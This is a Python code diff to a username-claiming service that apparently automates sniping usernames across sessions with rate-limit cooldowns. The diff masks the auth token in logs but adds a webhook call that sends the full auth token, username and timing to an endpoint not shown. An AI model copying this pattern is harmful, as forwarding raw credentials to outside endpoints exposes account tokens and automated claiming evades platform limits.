@@ -2,12 +2,14 @@ from threading import Thread, Lock, Semaphore
 import itertools
 import time
 from utils.logger import log
+from utils.tools import obfuscate_auth
 
 class UsernameService:
-    def __init__(self, session_manager, username_manager, client, config):
+    def __init__(self, session_manager, username_manager, client, config, webhook):
         self.session_manager = session_manager
         self.username_manager = username_manager
         self.client = client
+        self.webhook = webhook
 
         self.checks_per_session = config.get("checks_per_session")
         self.cooldown_after_ratelimit = config.get("cooldown_after_ratelimit")
@@ -37,7 +39,9 @@ class UsernameService:
             if response.status_code == 200:
                 with self.stop_lock:
                     if not self.stop_flag: 
-                        log(f"[{session_id}] username '{username}' has been claimed on auth_token: {auth_token} in {elapsed_time_ms:.2f}ms", "claimed")
+                        parsed = f"{elapsed_time_ms:.2f}"
+                        log(f"[{session_id}] username '{username}' has been claimed on auth_token: {obfuscate_auth(auth_token)} in {parsed}ms", "claimed")
+                        self.webhook.send_webhook(username, auth_token, parsed)
                         self.stop_flag = True
         elif response.status_code == 200:
             if self.should_print_attempts and not self.stop_flag:
